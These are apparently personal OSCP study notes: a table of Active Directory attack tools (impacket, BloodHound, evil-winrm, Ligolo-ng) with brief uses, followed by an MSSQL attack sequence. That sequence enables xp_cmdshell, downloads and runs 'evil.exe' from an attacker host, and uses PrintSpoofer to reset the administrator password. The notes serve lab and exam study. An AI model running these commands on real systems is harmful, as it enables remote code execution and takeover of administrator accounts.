
 
| impacket-psexec                                                                                                                                   | essentially, itâ€™s **remote code execution over SMB** (needs valid credentials + administrative rights on the target).<br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                          | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.                                                                                                                                                                                                                                                                      |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                                   | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                           |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                            | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| impacket-secretdump                                                                                                                               | dumps credentials remotely from our attacker machine, including sam, lsa, defaults....                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| evil-winrm                                                                                                                                        | Windows Remote Management spwn a shell                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView)<br> | <br>A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [PingCastle](https://www.pingcastle.com/documentation/)<br><br>                                                                                   | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                                   |
| impacket-GetNPUsers                                                                                                                               | Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| impacket-GetUserSPNs                                                                                                                              | finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| impacket-wmiexec                                                                                                                                  | provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                     | finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| impacket-raiseChild                                                                                                                               | automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| impacket-mssqlclient                                                                                                                              | provides the ability to interact with MSSQL databases. used when we have TGS of sql                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Ligolo-ng                                                                                                                                         | c2 establish tunnels though reverse shell                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| impacket-smbserver                                                                                                                                | create an smb serve to pass files                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |


### Impacket

**mssqlclient**
```sh

#sql service account tgs

impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth

enable_xp_cmdshell

#find a dir to write on

xp_cmdshell dir c:\users\public\document

xp_cmdshell curl http://10.10.10.10/evil.exe  -o c:\users\public\document\evil.exe 

xp_cmdshell  c:\users\public\document\evil.exe 

#or use printspoofer or so to basically change the admin passowrd 
printspoofer -i -c "net user administrator password123"
#disable wifewall enable rdp 
evil-winrm ....


```